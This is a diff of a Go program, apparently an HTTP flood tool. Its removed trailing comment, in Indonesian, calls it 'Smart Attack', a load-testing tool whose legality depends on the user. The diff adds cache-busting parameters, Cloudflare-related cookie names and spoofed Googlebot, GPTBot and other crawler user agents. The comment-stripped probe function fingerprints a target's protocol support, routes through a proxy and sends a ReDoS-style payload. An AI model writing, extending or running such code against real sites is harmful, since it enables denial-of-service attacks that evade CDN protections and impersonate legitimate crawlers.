@@ -199,6 +199,17 @@ var PFS = []BPF{
 	},
 }
 
+var cacheParams = []string{"_", "cb", "rnd", "ts", "cache", "v", "ver", "t", "q", "s", "page", "id", "rand", "random"}
+var cookieNames = []string{"session", "__cfduid", "_ga", "_gid", "visitor", "token", "cf_clearance", "__cf_bm"}
+var botUAs = []string{
+	"Mozilla/5.0 AppleWebKit/537.36 (KHTML, like Gecko; compatible; GPTBot/1.2; +https://openai.com/gptbot)",
+	"Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
+	"Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
+	"Mozilla/5.0 (compatible; Yahoo! Slurp; http://help.yahoo.com/help/us/ysearch/slurp)",
+	"Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
+	"Mozilla/5.0 (compatible; YandexBot/3.0; +http://yandex.com/bots)",
+}
+
 type ProbeResult struct {
 	MaxPayload          int
 	MaxHeader           int
@@ -962,7 +973,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 	}
 	rng := rand.New(rand.NewSource(time.Now().UnixNano()))
 
-	// WebSocket
 	reqWS, _ := http.NewRequest("GET", target, nil)
 	reqWS.Header.Set("User-Agent", "Mozilla/5.0")
 	reqWS.Header.Set("Connection", "Upgrade")
@@ -977,7 +987,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// gRPC
 	reqGRPC, _ := http.NewRequest("GET", target, nil)
 	reqGRPC.Header.Set("User-Agent", "Mozilla/5.0")
 	reqGRPC.Header.Set("Content-Type", "application/grpc")
@@ -991,7 +1000,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// Range
 	reqRange, _ := http.NewRequest("GET", target, nil)
 	reqRange.Header.Set("User-Agent", "Mozilla/5.0")
 	reqRange.Header.Set("Range", "bytes=0-1024")
@@ -1003,7 +1011,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// Compression (Content-Encoding)
 	var b bytes.Buffer
 	w := zlib.NewWriter(&b)
 	w.Write([]byte(strings.Repeat("x", 1000)))
@@ -1020,7 +1027,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// Multipart
 	bodyBuf := &bytes.Buffer{}
 	writer := multipart.NewWriter(bodyBuf)
 	part, _ := writer.CreateFormFile("file", "test.dat")
@@ -1037,7 +1043,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// JSON
 	jsonPayload := `{"test":"data"}`
 	reqJSON, _ := http.NewRequest("POST", target, strings.NewReader(jsonPayload))
 	reqJSON.Header.Set("User-Agent", "Mozilla/5.0")
@@ -1050,7 +1055,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// ReDoS
 	redosPayload := strings.Repeat("a", 1000) + "!"
 	reqReDOS, _ := http.NewRequest("POST", target, strings.NewReader(redosPayload))
 	reqReDOS.Header.Set("User-Agent", "Mozilla/5.0")
@@ -1063,7 +1067,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// Cookies
 	reqCookies, _ := http.NewRequest("GET", target, nil)
 	reqCookies.Header.Set("User-Agent", "Mozilla/5.0")
 	reqCookies.Header.Set("Cookie", "test=1; session=abc")
@@ -1075,7 +1078,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// Keep-Alive
 	reqKeepAlive, _ := http.NewRequest("GET", target, nil)
 	reqKeepAlive.Header.Set("User-Agent", "Mozilla/5.0")
 	reqKeepAlive.Header.Set("Connection", "keep-alive")
@@ -1088,7 +1090,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 		}
 	}
 
-	// HTTP/2 specific
 	parsed, _ := url.Parse(target)
 	host := parsed.Hostname()
 	conn, err := tls.Dial("tcp", net.JoinHostPort(host, "443"), &tls.Config{
@@ -1102,8 +1103,6 @@ func probeAdvancedFeatures(target string, proxyIP string) {
 			probeResult.SupportsPing = true
 			probeResult.SupportsSettings = true
 			probeResult.SupportsWindowUpdate = true
-			// Try to get settings from server
-			// We can't easily get these via stdlib, so we set defaults
 			probeResult.MaxConcurrentStreams = 100
 			probeResult.InitialWindowSize = 65535
 			probeResult.MaxFrameSize = 16384
@@ -1750,7 +1749,3 @@ func main() {
 	wg2.Wait()
 	fmt.Println()
 }
-// Smart Attack Adalah alat pengujian yang di rancang untuk melakukan pengujian pengecekan pengetesan dan berbagai lainya lalu melakukan pengujian beban ke target.
-// Ilegal atau tidak nya itu tergantung yang menggunakan.
-// Alat ini canggih tapi tetap punya resiko.
-// Pembuat lepas tangan kalo alat ini di salah gunakan.
